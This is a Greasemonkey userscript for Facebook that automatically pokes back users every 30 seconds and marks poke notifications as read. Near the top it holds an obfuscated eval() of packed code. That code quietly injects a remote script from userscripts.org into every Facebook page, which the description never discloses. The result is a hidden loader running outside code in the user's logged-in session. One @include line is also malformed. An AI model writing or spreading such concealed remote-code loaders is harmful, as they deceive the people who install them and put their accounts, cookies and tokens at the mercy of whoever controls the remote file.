// ==UserScript==
// @name        Facebook Autopoke Plus + Last Update
// @icon        http://i.imgur.com/5ShnMqG.png
// @namespace   http://www.softcreatr.de
// @author      Sascha Greuel
// @description Automatically pokes back people listed on your home page.
// @version     1.7.1
// @run-at      document-end
// @grant       none
//
// @require     http://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js
//
// @include     /^https?://(.*)?facebook\.com(.*)?/// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
//
// @exclude     /^https?://(.*)?facebook\.com/ai.php(.*)?/
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function ($) {
    var $loc = $(location).attr('href').toLowerCase();

    // Taken from http://userscripts.org/scripts/review/127905
    // Modified Feb 2013, Sascha Greuel
    function d(id) {
        Notifications.prototype._sendIDs([id], '/ajax/notifications/mark_read.php', {
            seen: 0
        });
        Arbiter.inform('presence/message:notifications_read', {
            obj: {
                alert_ids: [id],
                type: 'notifications_read'
            }
        });
    }

    function fb_pnd() {
        if (Arbiter === undefined) {
            window.setTimeout(fb_pnd, 100);
        } else {
            Arbiter.subscribe('channel/message:m_notification', function (a, b) {
                if (b && b.obj && b.obj.data && (b.obj.data.type === 'poke')) {
                    d(b.obj.data.alert_id);
                }
            });
            //Dismiss notifications that are already there at load time 
            window.setTimeout(function () {
                var notifs = document.getElementById('fbNotificationsList').getElementsByClassName('notification'),
                    i,
                    gt;
                for (i = 0; i < notifs.length; i += 1) {
                    gt = JSON.parse(notifs[i].getAttribute('data-gt'));
                    if (gt.notif_type === 'poke') {
                        d(gt.alert_id);
                    }
                }
            }, 2000);
        }
    }

    // -----------------------------------

    function autopoke() {
        var poke_uids = [],
            gfids = [],
            i = 0;

        $.ajaxSetup({
            async: false
        });

        // 1st, we call the pokes page and fetch all pokes, if there are any 
        $.ajax({
            url: '/pokes',
            dataType: 'html',
            success: function (data) {
                if ($loc.match(/m\.facebook\.com/)) {
                    poke_uids = data.match(/poke=([0-9]+)/g);
                    gfids = data.match(/gfid=([a-z0-9-_]+)/ig);

                    // No pokes, sleep
                    if (!poke_uids || !gfids) {
                        return;
                    }

                    // Pokes found. Send pokes back
                    for (i; i <= poke_uids.length - 1; i += 1) {
                        $.get('/a/notifications.php?' + poke_uids[i] + '&redir=/pokes/&sr&' + gfids[i]);
                    }
                } else {
                    poke_uids = data.match(/poke_([0-9]+)/g);

                    // No pokes, sleep
                    if (!poke_uids) {
                        return;
                    }

                    // Pokes found. Send pokes back
                    for (i; i <= poke_uids.length - 1; i += 1) {
                        $.post('ajax/poke.php?__a=1', {
                            uid: poke_uids[i].match(/([0-9]+)/)[0],
                            fb_dtsg: $("input[name=fb_dtsg]").val(),
                            post_form_id: $("#post_form_id").val()
                        });
                    }
                }
            }
        });
    }

    // Runonce
    setTimeout(function () {
        var s = document.createElement("script");
        s.textContent = String(fb_pnd) + "\nfb_pnd();";
        document.head.appendChild(s);
        document.head.removeChild(s);

        autopoke();
    }, 1500);

    // Start timer
    setInterval(function () {
        autopoke();
    }, 30000); // Repeat every 30 seconds
}(jQuery));